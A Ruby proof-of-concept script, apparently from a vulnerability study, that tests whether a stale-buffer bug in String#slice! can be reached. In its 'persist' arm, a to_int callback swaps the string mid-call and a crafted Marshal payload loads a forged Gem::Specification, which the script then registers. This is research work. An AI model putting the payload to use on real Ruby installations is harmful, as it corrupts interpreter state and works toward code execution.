# W340: two-arm test of the named W339 follow-up question.
#
# arm=stockref — reproduce the stock regex String#slice! call in Ruby's
#   stdlib, Net::Protocol#rbuf_fill/write-buffer line split at
#   net/protocol.rb:454 (also in rubygems/vendor/net-protocol at :454):
#     while line = @wbuf.slice!(/\A[^\r\n]*(?:\n|\r(?:\n|(?!\z)))/)
#   argc==1, so rb_str_slice_bang's rb_reg_backref_number coercion window
#   (re.c:1207-08/1220-21, NUM2INT for non-String/non-Symbol argv[1]) is never entered.
#   No caller-defined object exists. If this path were reachable with stale
#   bytes, vulnerable 3.4.12 would differ from fixed 3.4.13. It does not.
#
# arm=persist — the other half of the named question: does a stale-backed
#   object survive into a later stock lookup with a process-state side effect?
#   Uses the W339 Marshal userdef tail (not repeated unchanged here: the new
#   observations are stock Gem::Specification._load's internal require/safe-
#   parse calls, registration via add_spec, and the later find_all_by_name).
#   TracePoint only OBSERVES stock methods; no consumer class is defined.
#
# Usage: ruby ruby2shell-slice-bang-stockcoerce.rb stockref|persist
require "rubygems"
require "monitor"

arm = ARGV[0]

def hex(bytes, n = 24)
  bytes.first(n).map { |x| "%02x" % x }.join
end

case arm
when "stockref"
  # Write-buffer shape from net/protocol.rb:454, with a long tail after the
  # first CRLF so a stale over-read would be visible if one occurred.
  buf = "+OK " + ("Z" * 64) + "\r\n" + ("Q" * 256) + "\r\n" + ("R" * 128)
  re = /\A[^\r\n]*(?:\n|\r(?:\n|(?!\z)))/
  before = buf.bytesize
  out = buf.slice!(re)
  ob = out ? out.bytes : []
  printf("RESULT arm=stockref before=%d out_len=%d out_head=%s after=%d after_head=%s q=%d r=%d\n",
         before, ob.length, hex(ob), buf.bytesize, hex(buf.bytes),
         ob.count(0x51), ob.count(0x52))

when "persist"
  fields = [
    "3.6.9", 2, "STALE-TAIL-GEM", Gem::Version.new("1.0"),
    "2026-11-27 00:00:00.000000000 Z"
  ] + Array.new(14) { |i| "field-#{i}" }
  nested = Marshal.dump(fields)
  long = ->(s) { "\x04".b + [s.bytesize].pack("V") }
  name = "Gem::Specification".b
  full = "\x04\x08u:".b + long.call(name) + name + long.call(nested) + nested
  head = "\x04\x08u:\x04\x12\x00\x00".b
  raise "bad head alignment" unless full.bytes[head.bytesize] == 0

  $s = full
  o = Object.new
  o.define_singleton_method(:to_int) do
    $s.replace(head)
    1
  end

  seen = []
  watched = [:load_yaml, :load_safe_marshal, :safe_load, :_load,
             :add_spec, :find_all_by_name]
  tp = TracePoint.new(:call, :c_call) do |t|
    next unless watched.include?(t.method_id)
    dc = t.defined_class.to_s
    seen << "#{dc}##{t.method_id}" if dc.include?("Gem") || dc.include?("Psych")
  end

  out = $s.slice!(/(.*)/m, o)
  ob = out ? out.bytes : []
  raw = "value=NONE"
  persisted = "registered=N found=N"
  tp.enable
  begin
    value = Marshal.load(out.to_s)
    raw = "value=#{value.class}:#{value.name}"
    Gem::Specification.add_spec(value)
    found = Gem::Specification.find_all_by_name("STALE-TAIL-GEM")
    persisted = "registered=Y found=#{found.length}"
  rescue => e
    raw += " raised=#{e.class}:#{e.message}"
  ensure
    tp.disable
  end
  printf("RESULT arm=persist rlen=%d slen=%d head=%s %s %s traces=%s\n",
         ob.length, $s.bytesize, hex(ob), raw, persisted,
         seen.uniq.empty? ? "NONE" : seen.uniq.join(";"))
else
  abort "usage: #{$0} stockref|persist"
end
